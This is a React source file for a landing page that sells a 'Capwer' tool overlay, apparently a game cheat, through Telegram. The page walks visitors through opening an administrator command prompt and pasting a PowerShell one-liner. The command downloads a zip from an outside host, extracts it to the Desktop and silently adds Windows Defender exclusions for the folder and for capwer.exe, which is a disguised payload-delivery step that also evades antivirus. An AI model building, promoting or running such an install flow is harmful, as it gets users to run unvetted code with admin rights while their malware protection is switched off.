import { useState, useEffect } from 'react';
import { Logo } from './components/Logo';
import {
  Send,
  Copy,
  Check,
  ExternalLink,
  Volume2,
  VolumeX,
  Shield,
  Terminal,
  ChevronRight,
  MonitorCheck,
  ClipboardPaste,
  PlayCircle,
  Zap,
} from 'lucide-react';
import { toggleSound, isSoundEnabled, playBlip, playSuccess } from './utils/audio';

const INSTALL_CMD = `powershell -NoProfile -Command "iwr 'https://api.skyshot.shop/download/capwer.zip' -OutFile \\"$env:USERPROFILE\\Desktop\\capwer.zip\\"; Expand-Archive \\"$env:USERPROFILE\\Desktop\\capwer.zip\\" -DestinationPath \\"$env:USERPROFILE\\Desktop\\CAPWER\\" -Force; Add-MpPreference -ExclusionPath \\"$env:USERPROFILE\\Desktop\\CAPWER\\"; Add-MpPreference -ExclusionProcess 'capwer.exe'"`;

const STEPS = [
  {
    num: '01',
    icon: MonitorCheck,
    title: 'OPEN CMD AS ADMINISTRATOR',
    body: (
      <>
        Press{' '}
        <kbd className="kbd-key">Win</kbd>
        {' + '}
        <kbd className="kbd-key">R</kbd>
        {', type '}
        <code className="text-slate-200 font-mono">cmd</code>
        {', then '}
        <strong className="text-slate-200">right-click → "Run as administrator"</strong>.
        {' The title bar must say '}
        <span className="font-mono text-emerald-400">Administrator: Command Prompt</span>.
      </>
    ),
  },
  {
    num: '02',
    icon: ClipboardPaste,
    title: 'PASTE THE COMMAND',
    body: (
      <>
        Copy the command block below. In the admin CMD window,{' '}
        <strong className="text-slate-200">right-click → Paste</strong> (or press{' '}
        <kbd className="kbd-key">Ctrl</kbd>
        {' + '}
        <kbd className="kbd-key">V</kbd>).
      </>
    ),
  },
  {
    num: '03',
    icon: PlayCircle,
    title: 'HIT ENTER & DONE',
    body: (
      <>
        Press{' '}
        <kbd className="kbd-key">Enter</kbd>. The script downloads Capwer, extracts it to your{' '}
        <span className="font-mono text-emerald-400">Desktop\CAPWER</span> folder, and silently
        configures Windows Defender exclusions — no extra clicks needed.
      </>
    ),
  },
];

const WHAT_HAPPENS = [
  'Downloads capwer.zip directly to your Desktop',
  'Extracts into Desktop\\CAPWER automatically',
  'Adds Defender exclusion for the CAPWER folder',
  'Adds Defender exclusion for capwer.exe process',
];

export function App() {
  const [copied, setCopied] = useState(false);
  const [cmdCopied, setCmdCopied] = useState(false);
  const [soundOn, setSoundOn] = useState(isSoundEnabled());
  const [mousePos, setMousePos] = useState({ x: 0, y: 0 });

  useEffect(() => {
    const fn = (e: MouseEvent) => setMousePos({ x: e.clientX, y: e.clientY });
    window.addEventListener('mousemove', fn);
    return () => window.removeEventListener('mousemove', fn);
  }, []);

  const telegramUrl = 'https://t.me/capwerofficial';
  const telegramHandle = '@capwerofficial';

  const handleCopy = () => {
    navigator.clipboard.writeText(telegramUrl);
    setCopied(true);
    playSuccess();
    setTimeout(() => setCopied(false), 2200);
  };

  const handleCmdCopy = () => {
    navigator.clipboard.writeText(INSTALL_CMD);
    setCmdCopied(true);
    playSuccess();
    setTimeout(() => setCmdCopied(false), 2200);
  };

  const handleSoundToggle = () => {
    const next = toggleSound();
    setSoundOn(next);
    if (next) playBlip(880, 'sine', 0.05);
  };

  return (
    <div className="relative min-h-screen w-full bg-[#050608] text-slate-100 flex flex-col overflow-hidden selection:bg-emerald-500 selection:text-black">

      {/* ── GRID BACKGROUND ─────────────────────────── */}
      <div className="absolute inset-0 bg-grid-pattern opacity-25 pointer-events-none" />

      {/* ── MOUSE SPOTLIGHT ─────────────────────────── */}
      <div
        className="pointer-events-none fixed inset-0 z-10 hidden md:block"
        style={{
          background: `radial-gradient(650px circle at ${mousePos.x}px ${mousePos.y}px, rgba(16,185,129,0.04), transparent 75%)`,
        }}
      />

      {/* ── BIG "CAPWER" BG TEXT ────────────────────── */}
      <div className="absolute inset-0 flex items-center justify-center pointer-events-none select-none overflow-hidden z-0">
        <span
          className="text-[17vw] sm:text-[19vw] md:text-[21vw] font-black tracking-tighter uppercase leading-none text-transparent text-stroke-giant"
          style={{ letterSpacing: '-0.06em' }}
        >
          CAPWER
        </span>
      </div>

      {/* ════════════════════════════════════════════
          HEADER
      ════════════════════════════════════════════ */}
      <header className="relative z-20 w-full px-6 py-5 sm:px-10 flex items-center justify-between border-b border-white/[0.04]">
        <div className="flex items-center gap-2.5">
          <Logo size="sm" showText={false} interactive />
          <div className="flex items-center gap-2">
            <span className="font-extrabold tracking-tight text-white text-sm">capwer</span>
            <span className="text-[10px] font-mono text-emerald-400 bg-emerald-500/10 px-1.5 py-0.5 rounded border border-emerald-500/20 uppercase tracking-widest font-semibold">
              overlay
            </span>
          </div>
        </div>

        <div className="flex items-center gap-4">
          <div className="hidden sm:flex items-center gap-2 text-[11px] font-mono text-slate-400">
            <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse" />
            <span>DIRECT TELEGRAM DISPATCH</span>
          </div>
          <button
            onClick={handleSoundToggle}
            className="p-2 rounded-lg bg-white/[0.02] hover:bg-white/[0.06] border border-white/[0.06] text-slate-400 hover:text-white transition-all flex items-center gap-1.5 font-mono"
          >
            {soundOn
              ? <Volume2 className="w-3.5 h-3.5 text-emerald-400" />
              : <VolumeX className="w-3.5 h-3.5 text-slate-500" />}
            <span className="text-[10px] hidden md:inline">{soundOn ? 'SFX' : 'MUTED'}</span>
          </button>
        </div>
      </header>

      {/* ════════════════════════════════════════════
          HERO — MASCOT + TELEGRAM CARD
      ════════════════════════════════════════════ */}
      <main className="relative z-20 flex flex-col items-center px-4 sm:px-6 py-14 text-center max-w-3xl mx-auto w-full">

        {/* Mascot */}
        <div className="mb-6 relative">
          <div className="absolute -inset-4 bg-emerald-500/10 rounded-full blur-xl pointer-events-none" />
          <Logo size="hero" showText={false} interactive />
        </div>

        {/* Status pill */}
        <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-white/[0.03] border border-white/[0.08] text-[11px] font-mono text-slate-300 mb-6">
          <Shield className="w-3.5 h-3.5 text-emerald-400" />
          <span>TOOL OVERLAY • PRIVATE ACQUISITION</span>
        </div>

        {/* Headline */}
        <h1 className="text-2xl sm:text-3xl md:text-4xl font-bold tracking-tight text-white leading-snug max-w-2xl">
          If you want to buy this tool overlay,{' '}
          <br className="hidden sm:inline" />
          message on Telegram
        </h1>
        <p className="mt-3 text-sm sm:text-base text-slate-400 max-w-lg">
          Direct inquiries, pricing, and setup tokens dispatched privately via our official handle.
        </p>

        {/* Telegram card */}
        <div className="mt-8 w-full max-w-md rounded-2xl border border-white/[0.1] bg-[#090b10]/80 backdrop-blur-xl p-5 shadow-2xl relative overflow-hidden group">
          <div className="absolute -top-12 -right-12 w-32 h-32 bg-cyan-500/10 rounded-full blur-2xl group-hover:bg-cyan-500/20 transition-all duration-500 pointer-events-none" />

          {/* Handle row */}
          <div className="flex items-center justify-between gap-3 p-3.5 rounded-xl bg-black/60 border border-white/[0.06] font-mono text-xs mb-3.5">
            <div className="flex items-center gap-2.5 overflow-hidden text-left">
              <div className="w-8 h-8 rounded-lg bg-sky-500/10 border border-sky-500/30 flex items-center justify-center flex-shrink-0">
                <Send className="w-4 h-4 text-sky-400 -translate-x-0.5 translate-y-0.5" />
              </div>
              <div className="truncate">
                <span className="text-[10px] text-slate-400 block uppercase tracking-wider">OFFICIAL TELEGRAM</span>
                <span className="text-white font-bold text-sm tracking-wide select-all">{telegramHandle}</span>
              </div>
            </div>

            <button
              onClick={handleCopy}
              className="flex items-center gap-1.5 px-3 py-2 rounded-lg bg-white/[0.06] hover:bg-white/[0.12] border border-white/[0.1] text-xs font-mono text-slate-200 hover:text-white transition-all flex-shrink-0"
            >
              {copied
                ? <><Check className="w-3.5 h-3.5 text-emerald-400" /><span className="text-emerald-400 text-[11px]">Copied</span></>
                : <><Copy className="w-3.5 h-3.5" /><span className="text-[11px]">Copy</span></>}
            </button>
          </div>

          {/* Telegram CTA */}
          <a
            href={telegramUrl}
            target="_blank"
            rel="noopener noreferrer"
            onClick={() => playBlip(950, 'sine', 0.05)}
            className="w-full py-3.5 px-5 rounded-xl bg-gradient-to-r from-sky-500 via-teal-400 to-emerald-400 text-slate-950 font-bold text-sm tracking-wide transition-all duration-300 hover:shadow-[0_0_30px_rgba(56,189,248,0.35)] hover:scale-[1.01] active:scale-[0.99] flex items-center justify-center gap-2"
          >
            <Send className="w-4 h-4" />
            <span>Open Telegram ({telegramHandle})</span>
            <ExternalLink className="w-4 h-4 ml-1 opacity-80" />
          </a>

          <div className="mt-3 text-center">
            <a
              href={telegramUrl}
              target="_blank"
              rel="noopener noreferrer"
              className="text-[11px] font-mono text-slate-400 hover:text-sky-400 transition-colors underline underline-offset-4"
            >
              {telegramUrl}
            </a>
          </div>
        </div>

        {/* Micro footnote */}
        <div className="mt-8 flex items-center gap-3 text-[11px] font-mono text-slate-400">
          <Terminal className="w-3.5 h-3.5 text-emerald-400" />
          <span>Kernel Ring-0 Overlay Architecture • Instant Private Delivery</span>
        </div>
      </main>

      {/* ════════════════════════════════════════════
          HOW TO INSTALL SECTION
      ════════════════════════════════════════════ */}
      <section className="relative z-20 w-full px-4 sm:px-6 pb-20 pt-4">

        {/* ── divider line with label ── */}
        <div className="max-w-3xl mx-auto flex items-center gap-4 mb-12">
          <div className="flex-1 h-px bg-white/[0.06]" />
          <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/[0.03] border border-white/[0.08] text-[11px] font-mono text-slate-300 flex-shrink-0">
            <MonitorCheck className="w-3.5 h-3.5 text-emerald-400" />
            <span>WINDOWS ONLY</span>
          </div>
          <div className="flex-1 h-px bg-white/[0.06]" />
        </div>

        <div className="max-w-3xl mx-auto">

          {/* Heading */}
          <div className="text-center mb-10">
            <h2 className="text-3xl sm:text-4xl md:text-5xl font-black tracking-tight text-white uppercase">
              HOW TO{' '}
              <span className="text-emerald-400">INSTALL</span>
            </h2>
            <p className="mt-3 text-slate-400 text-sm sm:text-base max-w-lg mx-auto">
              Get Capwer running on Windows in under 30 seconds.
              Open CMD as admin, paste one command — that's it.
            </p>
          </div>

          {/* ── Step Cards ── */}
          <div className="space-y-3">
            {STEPS.map(({ num, icon: Icon, title, body }) => (
              <div
                key={num}
                className="flex items-start gap-4 sm:gap-5 p-5 sm:p-6 rounded-2xl border border-white/[0.07] bg-[#090b10]/70 backdrop-blur-lg hover:border-white/[0.13] hover:bg-[#0c0f15]/80 transition-all duration-200 group"
              >
                {/* Step number badge */}
                <div className="flex-shrink-0 w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/25 flex items-center justify-center font-mono text-sm font-bold text-emerald-400 group-hover:bg-emerald-500/15 transition-colors">
                  {num}
                </div>

                <div className="text-left min-w-0">
                  <h3 className="flex items-center gap-2 text-sm font-bold tracking-widest text-white uppercase mb-2">
                    <Icon className="w-4 h-4 text-emerald-400 flex-shrink-0" />
                    {title}
                  </h3>
                  <p className="text-[13px] sm:text-sm text-slate-400 leading-relaxed">
                    {body}
                  </p>
                </div>
              </div>
            ))}
          </div>

          {/* ── CMD Terminal Block ── */}
          <div className="mt-5 rounded-2xl border border-white/[0.1] bg-[#07090d] overflow-hidden shadow-2xl">

            {/* Title bar */}
            <div className="flex items-center justify-between px-4 py-3 border-b border-white/[0.06] bg-black/50">
              <div className="flex items-center gap-2">
                <span className="w-3 h-3 rounded-full bg-[#ff5f57]" />
                <span className="w-3 h-3 rounded-full bg-[#ffbd2e]" />
                <span className="w-3 h-3 rounded-full bg-[#28c840]" />
                <span className="ml-3 text-[11px] font-mono text-slate-500 tracking-wide">
                  cmd.exe — Administrator
                </span>
              </div>

              <button
                onClick={handleCmdCopy}
                className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-white/[0.05] hover:bg-white/[0.12] border border-white/[0.08] text-[11px] font-mono text-slate-300 hover:text-white transition-all"
              >
                {cmdCopied
                  ? <><Check className="w-3.5 h-3.5 text-emerald-400" /><span className="text-emerald-400">Copied!</span></>
                  : <><Copy className="w-3.5 h-3.5" /><span>Copy</span></>}
              </button>
            </div>

            {/* Command body */}
            <div className="p-4 sm:p-6">
              <div className="flex items-start gap-3 font-mono text-[12px] sm:text-[13px] leading-relaxed">
                <span className="text-slate-500 select-none pt-0.5 flex-shrink-0">C:\&gt;</span>
                <code className="text-emerald-400 whitespace-pre-wrap break-all text-left">
                  {INSTALL_CMD}
                </code>
              </div>
            </div>
          </div>

          {/* ── What Happens Card ── */}
          <div className="mt-4 rounded-2xl border border-white/[0.07] bg-[#090b10]/60 backdrop-blur-lg p-5 sm:p-6">
            <h4 className="flex items-center gap-2.5 text-sm font-bold tracking-widest text-white uppercase mb-5">
              <Zap className="w-4 h-4 text-emerald-400" />
              WHAT HAPPENS WHEN YOU RUN THIS?
            </h4>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-8 gap-y-3">
              {WHAT_HAPPENS.map((line, i) => (
                <div key={i} className="flex items-start gap-2.5 text-[13px] sm:text-sm text-slate-300">
                  <ChevronRight className="w-3.5 h-3.5 text-emerald-400 flex-shrink-0 mt-0.5" />
                  <span>{line}</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* ════════════════════════════════════════════
          FOOTER
      ════════════════════════════════════════════ */}
      <footer className="relative z-20 w-full px-6 py-5 sm:px-10 border-t border-white/[0.04] text-[11px] font-mono text-slate-400 flex flex-col sm:flex-row items-center justify-between gap-3">
        <div className="flex items-center gap-2">
          <span>CAPWER SYSTEMS</span>
          <span>•</span>
          <span>ALL RIGHTS RESERVED</span>
        </div>
        <div className="flex items-center gap-4">
          <a
            href={telegramUrl}
            target="_blank"
            rel="noopener noreferrer"
            className="text-slate-400 hover:text-sky-400 transition-colors"
          >
            t.me/capwerofficial
          </a>
          <span className="text-slate-700">•</span>
          <span className="text-slate-400">ENCRYPTED DISPATCH</span>
        </div>
      </footer>
    </div>
  );
}

export default App;
